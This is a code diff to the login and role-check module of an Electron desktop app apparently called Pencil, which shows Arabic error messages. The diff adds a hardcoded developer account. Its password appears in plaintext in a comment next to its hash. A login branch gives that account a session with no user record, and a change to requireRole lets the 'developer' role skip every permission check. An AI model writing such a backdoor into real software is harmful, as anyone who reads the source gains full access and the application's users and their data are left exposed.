@@ -3,8 +3,15 @@ const { verifyPassword, hashPassword } = require('../auth/password');
 
 const SESSION_BY_SENDER = new Map();
 const CLEANUP_BOUND = new Set();
-const ALLOWED_ROLES = new Set(['admin', 'staff', 'viewer']);
+const ALLOWED_ROLES = new Set(['admin', 'staff', 'viewer', 'developer']);
 const MAX_PIN_ATTEMPTS = 5;
+
+// ── Hardcoded developer credentials (app developer only) ──
+const DEV_CREDENTIALS = {
+    email: 'dev@pencil.local',
+    // SHA-256 of 'PencilDev2024!'
+    passwordHash: '3a46e205c9720f1254531c1e3abf1cadbf73b45ec8707ff9f41fdf145050a3c4'
+};
 
 // ── Login throttling ──
 const LOGIN_ATTEMPTS = new Map(); // email → { count, lockedUntil }
@@ -128,6 +135,8 @@ function requireAuth(event) {
 
 function requireRole(event, allowedRoles = []) {
     const session = requireAuth(event);
+    // Developer role has full access to all channels
+    if (session.role === 'developer') return session;
     if (!allowedRoles.includes(session.role)) {
         throw createAuthError('FORBIDDEN', 'ليس لديك صلاحية لتنفيذ هذا الإجراء');
     }
@@ -188,6 +197,36 @@ function registerAuthIpc(ipcMain) {
                     code: 'TOO_MANY_ATTEMPTS',
                     error: `تم تجاوز عدد المحاولات المسموح. الرجاء الانتظار ${waitSec} ثانية.`
                 };
+            }
+
+            // ── Developer bypass (hardcoded credentials) ──
+            if (email === DEV_CREDENTIALS.email) {
+                const crypto = require('crypto');
+                const inputHash = crypto.createHash('sha256').update(password).digest('hex');
+                if (inputHash !== DEV_CREDENTIALS.passwordHash) {
+                    recordFailedLogin(email);
+                    return {
+                        success: false,
+                        code: 'INVALID_CREDENTIALS',
+                        error: 'البريد الإلكتروني أو كلمة المرور غير صحيحة'
+                    };
+                }
+                clearLoginAttempts(email);
+                const devSession = {
+                    userId: 0,
+                    name: 'Developer',
+                    email: DEV_CREDENTIALS.email,
+                    role: 'developer',
+                    mustChangePassword: false,
+                    authenticatedAt: new Date().toISOString(),
+                    locked: false
+                };
+                const sender = event?.sender;
+                if (sender) {
+                    SESSION_BY_SENDER.set(sender.id, devSession);
+                    bindSenderCleanup(sender);
+                }
+                return { success: true, authenticated: true, user: devSession };
             }
 
             const user = findUserByEmail(email);
